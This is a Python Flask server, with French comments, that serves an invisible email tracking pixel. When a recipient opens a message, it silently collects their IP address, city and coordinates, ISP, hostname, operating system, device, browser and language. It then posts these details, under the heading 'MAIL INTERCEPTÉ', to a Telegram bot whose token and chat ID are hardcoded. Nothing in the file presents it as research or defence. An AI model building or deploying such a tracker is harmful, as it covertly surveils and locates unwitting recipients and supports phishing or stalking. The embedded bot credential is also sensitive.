from flask import Flask, request
import requests
from datetime import datetime
import socket
from user_agents import parse

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = "8986564824:AAGiYW3YLJphUiZUH4pGRUF3tkT2Tot2SVs"
TELEGRAM_CHAT_ID = "-5341829903"

def get_geolocation(ip):
    """Récupère la géolocalisation par IP via ipinfo.io (meilleure précision)"""
    try:
        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
        if resp.status_code == 200:
            data = resp.json()
            loc = data.get('loc', 'N/A,N/A').split(',')
            return {
                'country': data.get('country', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'region': data.get('region', ''),
                'lat': loc[0] if len(loc) > 0 else 'N/A',
                'lon': loc[1] if len(loc) > 1 else 'N/A',
                'isp': data.get('org', 'Unknown'),
                'timezone': data.get('timezone', 'N/A')
            }
    except:
        pass
    return {'country': 'N/A', 'city': 'N/A', 'region': '', 'lat': 'N/A', 'lon': 'N/A', 'isp': 'N/A', 'timezone': 'N/A'}

def parse_user_agent(ua_string):
    """Parse le User-Agent pour extraire OS, device, browser"""
    ua = parse(ua_string)
    return {
        'os': str(ua.os),
        'device': str(ua.device),
        'browser': str(ua.browser)
    }

def reverse_dns(ip):
    """Reverse DNS lookup"""
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        return hostname
    except:
        return 'N/A'

def calculate_open_time(sent_timestamp):
    """Calcule le temps entre envoi et ouverture"""
    try:
        sent_time = datetime.fromisoformat(sent_timestamp)
        open_time = datetime.now()
        delta = (open_time - sent_time).total_seconds()
        return f"{int(delta)}s"
    except:
        return 'N/A'

@app.route('/pixel', methods=['GET'])
def tracker():
    """Pixel tracker avancé avec géolocalisation, parsing, timing"""

    email = request.args.get('email', 'unknown')
    unique_id = request.args.get('id', 'unknown')
    sent_time = request.args.get('sent_time', 'N/A')

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()

    user_agent_str = request.headers.get('User-Agent', 'unknown')
    ua_parsed = parse_user_agent(user_agent_str)

    accept_language = request.headers.get('Accept-Language', 'N/A')
    referer = request.headers.get('Referer', 'Direct')

    geo = get_geolocation(ip)
    hostname = reverse_dns(ip)
    open_duration = calculate_open_time(sent_time)

    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    city_display = f"{geo['city']}" + (f", {geo['region']}" if geo['region'] else "")
    if city_display == "" or city_display == ", ":
        city_display = "Unknown"

    os_ver = ua_parsed['os'].version_string if hasattr(ua_parsed['os'], 'version_string') else str(ua_parsed['os'])
    device_fam = ua_parsed['device'].family if hasattr(ua_parsed['device'], 'family') else str(ua_parsed['device'])
    browser_fam = ua_parsed['browser'].family if hasattr(ua_parsed['browser'], 'family') else str(ua_parsed['browser'])
    browser_ver = ua_parsed['browser'].version_string if hasattr(ua_parsed['browser'], 'version_string') else ''

    message = f"""🎯 MAIL INTERCEPTÉ 📬
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 Email: {email}
🌐 IP: {ip}

🌍 Ville: {city_display}
🌐 Pays: {geo['country']}
📍 Coords: {geo['lat']}, {geo['lon']}
⏰ Timezone: {geo['timezone']}
🏢 ISP: {geo['isp']}
🖥️ Hostname: {hostname}

📱 OS: {os_ver}
🖲️ Device: {device_fam}
🌐 Browser: {browser_fam} {browser_ver}

🗣️ Langue: {accept_language.split(',')[0]}
📄 Source: {referer}

✅ Ouvert: {now}
⏳ Délai: {open_duration} après envoi
🔖 ID: {unique_id}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": message},
            timeout=5
        )
    except:
        pass

    return b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x0dIDAT\x08\xd9c\xf8\x0f\x00\x00\x01\x01\x00\x05\xb6\xee6\x81\x00\x00\x00\x00IEND\xaeB`\x82', 200, {'Content-Type': 'image/png'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
